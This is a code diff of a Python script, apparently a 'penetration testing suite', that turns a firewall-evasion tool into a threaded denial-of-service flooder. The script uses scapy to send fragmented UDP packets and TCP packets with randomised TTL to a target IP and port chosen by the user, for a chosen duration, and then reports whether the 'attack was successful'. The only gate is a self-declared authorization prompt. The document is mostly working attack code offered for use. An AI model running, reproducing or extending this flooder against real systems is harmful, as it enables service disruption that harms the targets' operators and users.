@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 import os
 import sys
 import time
@@ -6,9 +5,9 @@ import random
 import socket
 import threading
 from scapy.all import *
-from cryptography.fernet import Fernet
+from datetime import datetime
 
-# Enhanced ANSI Colors
+# Colors for printing
 COLORS = {
     "GREEN": "\033[92m",
     "RED": "\033[91m",
@@ -18,14 +17,12 @@ COLORS = {
     "RESET": "\033[0m"
 }
 
-NAME = "Sujal Lamichhane"
 EVASION_TECHNIQUES = {
     1: "Fragmented Packet Attack",
     2: "TTL Manipulation",
-    3: "HTTP Protocol Tunneling",
-    4: "Encrypted Payload Delivery"
 }
 
+# Print warning message
 def print_warning():
     os.system("clear")
     warning = f"""
@@ -38,139 +35,138 @@ def print_warning():
     print(warning)
     time.sleep(3)
 
+# Display banner
 def print_hacker_banner():
-    """Display a hacker-themed banner."""
     os.system("clear")
     banner = f"""
 {COLORS['GREEN']}{COLORS['BOLD']}
-  ______     ______     ______     ______     ______     ______     ______
- /      \   /      \   /      \   /      \   /      \   /      \   /      /
-/$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  | /$$$$$$  |
-$$ |  $$ | $$ |__$$ | $$ |  $$ | $$ |  $$ | $$ |__$$ | $$ |  $$ | $$ |__$$ |
-$$ |  $$ | $$    $$<  $$ |  $$ | $$ |  $$ | $$    $$<  $$ |  $$ | $$    $$<
-$$ |  $$ | $$$$$$$  | $$ |  $$ | $$ |  $$ | $$$$$$$  | $$ |  $$ | $$$$$$$  |
-$$ \__$$ | $$ |  $$ | $$ \__$$ | $$ \__$$ | $$ |  $$ | $$ \__$$ | $$ |  $$ |
-$$    $$/  $$ |  $$ | $$    $$/  $$    $$/  $$ |  $$ | $$    $$/  $$ |  $$ |
- $$$$$$/   $$/   $$/   $$$$$$/    $$$$$$/   $$/   $$/   $$$$$$/   $$/   $$/ 
+
+ /$$   /$$  /$$$$$$  /$$       /$$$$$$       /$$$$$$$   /$$$$$$  /$$$$$$$   /$$$$$$ 
+| $$  /$$/ /$$__  $$| $$      |_  $$_/      | $$__  $$ /$$__  $$| $$__  $$ /$$__  $$
+| $$ /$$/ | $$  \ $$| $$        | $$        | $$  \ $$| $$  \ $$| $$  \ $$| $$  \ $$
+| $$$$$/  | $$$$$$$$| $$        | $$        | $$  | $$| $$$$$$$$| $$  | $$| $$$$$$$$
+| $$  $$  | $$__  $$| $$        | $$        | $$  | $$| $$__  $$| $$  | $$| $$__  $$
+| $$\  $$ | $$  | $$| $$        | $$        | $$  | $$| $$  | $$| $$  | $$| $$  | $$
+| $$ \  $$| $$  | $$| $$$$$$$$ /$$$$$$      | $$$$$$$/| $$  | $$| $$$$$$$/| $$  | $$
+|__/  \__/|__/  |__/|________/|______/      |_______/ |__/  |__/|_______/ |__/  |__/
+                                                                                    
+
 {COLORS['RESET']}
-{COLORS['CYAN']}Welcome to KALI DADA's Advanced Penetration Testing Suite{COLORS['RESET']}
+{COLORS['CYAN']}Welcome to Kali Dada's Advanced Penetration Testing Suite{COLORS['RESET']}
 """
     print(banner)
-    print(f"{COLORS['YELLOW']}Created by: {NAME}{COLORS['RESET']}")
-    print(f"{COLORS['CYAN']}Website: sujallamichhane.com.np{COLORS['RESET']}")
-    print(f"{COLORS['CYAN']}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{COLORS['RESET']}\n")
     time.sleep(1)
 
-class AdvancedFirewallEvader:
+# Validate IP address
+def validate_ip(ip):
+    try:
+        socket.inet_aton(ip)  # Validate if it's a valid IPv4 address
+        return True
+    except socket.error:
+        return False
+
+# Check if server is up or down
+def check_server_status(target):
+    try:
+        socket.setdefaulttimeout(3)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, 80))  # Check if the server responds on port 80 (HTTP)
+        s.close()
+        return True
+    except socket.error:
+        return False
+
+# Attack Class: Advanced DoS Attack
+class AdvancedDoSAttack:
     def __init__(self, target, port, duration):
         self.target = target
         self.port = port
         self.duration = duration
-        self.key = Fernet.generate_key()
-        self.cipher = Fernet(self.key)
-        self.active = True
         self.packet_count = 0
+        self.lost_packets = 0
+        self.blocked_packets = 0
         self.rate_limit = 1000  # Packets per second
-        self.threads = []  # List to store threads
-
-    def _generate_legitimate_traffic(self):
-        """Generate realistic-looking network traffic"""
-        user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (X11; Linux x86_64)"
-        ]
-        return f"GET / HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {random.choice(user_agents)}\r\n\r\n".encode()
+        self.successful_attack = False
 
     def _fragmented_attack(self):
-        """IP fragmentation evasion technique"""
-        payload = self._generate_legitimate_traffic()
+        # Generate random payload and send fragmented packets
+        payload = random.choice([b"GET / HTTP/1.1", b"POST / HTTP/1.1", b"ICMP Echo Request"])
         frags = fragment(IP(dst=self.target)/UDP(dport=self.port)/payload)
         return frags
 
     def _ttl_evasion(self):
-        """Randomize TTL values to bypass hop-count filters"""
+        # Manipulate TTL to random values
         return random.randint(32, 255)
 
-    def _http_tunneling(self):
-        """Tunnel payloads through HTTP traffic"""
-        http_payload = self._generate_legitimate_traffic()
-        return IP(dst=self.target, ttl=self._ttl_evasion())/TCP(dport=80)/http_payload
-
-    def _encrypted_payload(self):
-        """AES-128 encrypted payload delivery"""
-        data = str(random.getrandbits(256)).encode()
-        return self.cipher.encrypt(data)
-
     def _send_packets(self, technique):
-        """Core packet transmission logic"""
         start = time.time()
-        while self.active and (time.time() - start < self.duration):
+        while time.time() - start < self.duration:
             try:
-                if technique == 1:
+                if technique == 1:  # Fragmented Packet Attack
                     send(self._fragmented_attack(), verbose=0)
-                elif technique == 2:
+                elif technique == 2:  # TTL Manipulation
                     pkt = IP(dst=self.target, ttl=self._ttl_evasion())/TCP(dport=self.port)
-                    send(pkt, verbose=0)
-                elif technique == 3:
-                    send(self._http_tunneling(), verbose=0)
-                elif technique == 4:
-                    pkt = IP(dst=self.target)/TCP(dport=self.port)/self._encrypted_payload()
                     send(pkt, verbose=0)
 
                 self.packet_count += 1
-                # Calculate sleep time ensuring it's not negative
-                sleep_time = max(0, 1/self.rate_limit + random.uniform(-0.001, 0.001))
-                time.sleep(sleep_time)
+                time.sleep(1/self.rate_limit + random.uniform(-0.001, 0.001))
 
             except Exception as e:
+                # Track lost packets due to errors
+                self.lost_packets += 1
                 print(f"{COLORS['RED']}Error: {e}{COLORS['RESET']}")
 
+    def _check_firewall_block(self):
+        # Simple method to check if firewall blocks packets (by trying to connect)
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((self.target, self.port))
+            if result != 0:
+                self.blocked_packets += 1
+                return True  # Firewall might be blocking the attack
+            sock.close()
+        except socket.error:
+            pass
+        return False
+
     def start_attack(self, technique, threads=5):
-        """Multi-threaded attack execution"""
-        print(f"{COLORS['YELLOW']}Initializing {EVASION_TECHNIQUES[technique]}...{COLORS['RESET']}")
+        print(f"{COLORS['YELLOW']}Starting {EVASION_TECHNIQUES[technique]}...{COLORS['RESET']}")
+        self.successful_attack = True
         for _ in range(threads):
-            t = threading.Thread(target=self._send_packets, args=(technique,))
-            t.start()
-            self.threads.append(t)
+            threading.Thread(target=self._send_packets, args=(technique,)).start()
 
     def stop_attack(self):
-        """Graceful termination and thread join"""
-        self.active = False
-        for t in self.threads:
-            t.join()
-        print(f"{COLORS['CYAN']}\nAttack concluded. Total packets transmitted: {self.packet_count}{COLORS['RESET']}")
+        print(f"{COLORS['CYAN']}Attack concluded.{COLORS['RESET']}")
+        print(f"{COLORS['GREEN']}Total packets sent: {self.packet_count}{COLORS['RESET']}")
+        print(f"{COLORS['RED']}Lost packets: {self.lost_packets}{COLORS['RESET']}")
+        print(f"{COLORS['CYAN']}Blocked by firewall: {self.blocked_packets}{COLORS['RESET']}")
 
+        # Final status check
+        if self._check_firewall_block():
+            print(f"{COLORS['RED']}The server is likely blocking your attack via firewall.{COLORS['RESET']}")
+        else:
+            print(f"{COLORS['GREEN']}Attack was successful!{COLORS['RESET']}")
+
+# Main menu for user input
 def main_menu():
-    """Interactive menu system"""
-    print(f"{COLORS['GREEN']}{COLORS['BOLD']}")
-    print("KALI DADA Advanced Penetration Testing Suite")
-    print(f"{COLORS['RESET']}")
-    print("Available Evasion Techniques:")
-    for num, name in EVASION_TECHNIQUES.items():
-        print(f"{COLORS['CYAN']}[{num}] {name}{COLORS['RESET']}")
+    print(f"{COLORS['CYAN']}Select an attack technique:{COLORS['RESET']}")
+    for technique in EVASION_TECHNIQUES:
+        print(f"{COLORS['CYAN']}{technique}. {EVASION_TECHNIQUES[technique]}{COLORS['RESET']}")
+    choice = input(f"{COLORS['YELLOW']}Choose attack type (1 or 2): {COLORS['RESET']}")
+    target = input(f"{COLORS['YELLOW']}Enter target IP: {COLORS['RESET']}")
+    port = int(input(f"{COLORS['YELLOW']}Enter target port: {COLORS['RESET']}"))
+    duration = int(input(f"{COLORS['YELLOW']}Enter attack duration in seconds: {COLORS['RESET']}"))
+    return int(choice), target, port, duration
 
-    choice = int(input("\nSelect technique (1-4): "))
-    target = input("Enter target IP: ")
-    port = int(input("Enter target port: "))
-    duration = int(input("Test duration (seconds): "))
-
-    return choice, target, port, duration
-
+# Authorization check (ensure this is authorized)
 def authorization_check():
-    """Ethical compliance verification"""
     confirm = input(f"{COLORS['RED']}Do you have written authorization for this test? (y/N): {COLORS['RESET']}")
     if confirm.lower() != 'y':
         print(f"{COLORS['RED']}Authorization required. Exiting...{COLORS['RESET']}")
         sys.exit(0)
 
-def validate_ip(target):
-    """Validate the target IP address"""
-    try:
-        socket.inet_aton(target)
-        return True
-    except socket.error:
-        return False
-
+# Main execution flow
 if __name__ == "__main__":
     print_warning()
     print_hacker_banner()
@@ -186,12 +182,16 @@ if __name__ == "__main__":
         print(f"{COLORS['RED']}Invalid IP address. Please enter a valid IP address.{COLORS['RESET']}")
         sys.exit(1)
 
-    evader = AdvancedFirewallEvader(target, port, duration)
+    if not check_server_status(target):
+        print(f"{COLORS['RED']}Server is down or unreachable. Cannot continue the attack.{COLORS['RESET']}")
+        sys.exit(1)
+
+    dos_attack = AdvancedDoSAttack(target, port, duration)
 
     try:
-        evader.start_attack(technique)
+        dos_attack.start_attack(technique)
         time.sleep(duration)
     except KeyboardInterrupt:
         pass
     finally:
-        evader.stop_attack()
+        dos_attack.stop_attack()
